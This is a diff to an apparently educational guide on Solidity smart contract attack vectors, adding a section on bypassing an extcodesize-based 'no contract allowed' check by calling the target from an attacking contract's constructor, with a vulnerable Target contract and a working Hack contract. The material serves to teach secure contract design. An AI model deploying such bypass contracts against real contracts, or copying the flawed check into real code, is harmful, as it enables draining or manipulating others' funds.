@@ -2,7 +2,7 @@
 
 These are smart contract attack vectors and vulnerability with code examples.
 
-## SOLIDITY ATTACK VECTORS: #1 - REENTRANCY ATTACK
+## SOLIDITY ATTACK VECTORS #1 - REENTRANCY ATTACK
 
 A reentrancy attack in solidity repeatedly withdraws funds from a smart contract and transfers them to an unauthorized contract until the funds have been exhausted. The attack occurs when a smart contract function temporarily gives up control flow of the transaction by making an external call to a contract that is sometimes written by unknown or possibly hostile actors.
 
@@ -135,7 +135,7 @@ In the contract above, the state was updated before the transfer, there is also 
 ### CONCLUSION
 Re-entrancy attacks are made possible by the use of a logical but insecure code pattern when performing transfers within Ethereum smart contracts. Bad actors exploit the blockchain by implementing reentrancy attacks to transfer and drain funds from vulnerable smart contracts.
 
-## SOLIDITY ATTACK VECTORS: #2 - Arithmetic Overflow and Underflow
+## SOLIDITY ATTACK VECTORS #2 - Arithmetic Overflow and Underflow
 
 ### Overflow
 Overflow is a state a uint (unsigned integer) reaches its maximum value, the next element added will return the default value. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes greater than 255, the value is set to zero which is an incorrect calculation.
@@ -227,3 +227,63 @@ unchecked {
 ```
 
 * Solidity ≥0.8 defaults to throwing an error for overflow / underflow. It is handled by default.
+
+## SOLIDITY ATTACK VECTORS #3 - Contract With Zero Code Size
+In Ethereum, accounts can either be _Externally Owned Account, (EOA)_ or _Contract Account_.  
+
+A developer may decides to allow only _Externally Owned Addresses (EOA)_ to interact with his contract, then the developer can add a check via extcodesize, which returns a value greater than 0, then the log will print “no contract allowed”. We are going to bypass this check.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Target {
+    function isContract(address account) public view returns (bool) {
+        // This method relies on extcodesize, which returns 0 for contracts in
+        // construction, since the code is only stored at the end of the
+        // constructor execution.
+        uint size;
+        assembly {
+            size := extcodesize(account)
+        }
+        return size > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), "no contract allowed");
+        pwned = true;
+    }
+}
+```
+The contract below contains a function called **pwn**. When executed with the target address, the function fails. The target address will detect that this contract contains code which caused the call to fail.
+
+```solidity
+contract FailedAttack {
+    // Attempting to call Target.protected will fail,
+    // Target block calls from contract
+    function pwn(address _target) external {
+        // This will fail
+        Target(_target).protected();
+    }
+}
+```
+
+We can bypass this check by defining and calling the protected function of the Target contract as part of our malicious contract. The target contract is called in the constructor. The code size(extcodesize) of our contract is currently 0 the contract is under creation and hasn't been deployed.
+
+```solidity
+contract Hack {
+    bool public isContract;
+    address public addr;
+
+    // When contract is being created, code size (extcodesize) is 0.
+    // This will bypass the isContract() check
+    constructor(address _target) {
+        isContract = Target(_target).isContract(address(this));
+        addr = address(this);
+        // This will work
+        Target(_target).protected();
+    }
+}
+```
